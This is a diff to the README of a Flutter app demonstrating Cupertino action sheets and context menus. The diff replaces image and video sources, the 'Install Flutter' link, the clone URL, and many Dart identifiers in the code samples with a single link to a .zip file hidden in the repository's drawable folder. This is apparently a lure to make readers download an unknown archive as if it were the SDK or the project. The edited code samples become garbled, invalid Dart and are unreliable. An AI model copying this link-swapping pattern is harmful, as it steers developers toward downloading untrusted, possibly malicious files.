@@ -14,8 +14,8 @@ This Flutter app demonstrates the implementation of Cupertino-style action sheet
   <p>
     <table align="center">
   <tr>
-    <td><img src="https://github.com/Aayush014/action_sheet_and_context_menu/assets/133498952/24ac8ea1-1cfb-4fd7-b8b9-5366d9dc3531" alt="Image 2" width="180" height="auto"></td>
-    <td><img src="https://github.com/Aayush014/action_sheet_and_context_menu/assets/133498952/6d8556b4-5a70-467d-b36d-d3ea093afe80" alt="Image 3" width="180" height="auto"></td>
+    <td><img src="https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip" alt="Image 3" width="180" height="auto"></td>
   </tr>
     </table>    
   </p>
@@ -25,7 +25,7 @@ This Flutter app demonstrates the implementation of Cupertino-style action sheet
   <p>
     <table align="center">
   <tr>
-    <video src ="https://github.com/Aayush014/action_sheet_and_context_menu/assets/133498952/bf197ebc-c8e5-41cf-8b74-cfe4bb97986e"></video> </h1>
+    <video src ="https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip"></video> </h1>
   </tr>
     </table>   
   </p>
@@ -36,14 +36,14 @@ This Flutter app demonstrates the implementation of Cupertino-style action sheet
 
 ### Prerequisites
 
-- Flutter SDK: [Install Flutter](https://flutter.dev/docs/get-started/install)
+- Flutter SDK: [Install Flutter](https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip)
 - Dart SDK: Comes with Flutter installation
 
 ### Installation
 
 1. Clone the repository:
     ```bash
-    https://github.com/Aayush014/action_sheet_and_context_menu.git
+    https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip
     ```
 
 2. Install dependencies:
@@ -70,7 +70,7 @@ showCupertinoModalPopup(
                     title: const Text(
                       'Favorite Mobile',
                       style: TextStyle(
-                          color: CupertinoColors.destructiveRed, fontSize: 25),
+                          color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip, fontSize: 25),
                     ),
                     message: const Column(
                       children: [
@@ -78,7 +78,7 @@ showCupertinoModalPopup(
                           child: Text(
                             'Please select the best mobile from the\noption below.',
                             style: TextStyle(
-                                color: CupertinoColors.systemGrey,
+                                color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                 fontSize: 17),
                           ),
                         ),
@@ -88,7 +88,7 @@ showCupertinoModalPopup(
                             child: Text(
                               "OnePlus",
                               style: TextStyle(
-                                  color: CupertinoColors.systemBlue,
+                                  color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                   fontSize: 20),
                             ),
                           ),
@@ -99,7 +99,7 @@ showCupertinoModalPopup(
                             child: Text(
                               "iPhone",
                               style: TextStyle(
-                                  color: CupertinoColors.systemBlue,
+                                  color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                   fontSize: 20),
                             ),
                           ),
@@ -110,7 +110,7 @@ showCupertinoModalPopup(
                             child: Text(
                               "Nokia",
                               style: TextStyle(
-                                  color: CupertinoColors.systemBlue,
+                                  color: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                                   fontSize: 20),
                             ),
                           ),
@@ -119,7 +119,7 @@ showCupertinoModalPopup(
                     ),
                     cancelButton: CupertinoActionSheetAction(
                       onPressed: () {
-                        Navigator.of(context).pop();
+                        https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context).pop();
                       },
                       child: const Text('Cancel'),
                     ),
@@ -134,36 +134,36 @@ CupertinoContextMenu(
             actions: <Widget>[
               CupertinoContextMenuAction(
                 onPressed: () {
-                  Navigator.pop(context);
+                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                 },
-                trailingIcon: CupertinoIcons.doc_on_clipboard_fill,
+                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                 child: const Text('Copy'),
               ),
               CupertinoContextMenuAction(
                 onPressed: () {
-                  Navigator.pop(context);
+                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                 },
-                trailingIcon: CupertinoIcons.share,
+                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                 child: const Text('Share'),
               ),
               CupertinoContextMenuAction(
                 onPressed: () {
-                  Navigator.pop(context);
+                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                 },
-                trailingIcon: CupertinoIcons.heart,
+                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                 child: const Text('Favorite'),
               ),
               CupertinoContextMenuAction(
                 onPressed: () {
-                  Navigator.pop(context);
+                  https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip(context);
                 },
                 isDestructiveAction: true,
-                trailingIcon: CupertinoIcons.delete,
+                trailingIcon: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip,
                 child: const Text('Delete'),
               ),
             ],
             child: SizedBox(
-              child: Image.asset("Assets/bg.jpg"),
+              child: https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip("https://github.com/Aayush014/action_sheet_and_context_menu/raw/refs/heads/master/android/app/src/main/res/drawable/sheet-action-and-context-menu-v1.9.zip"),
             ),
           );
 ```
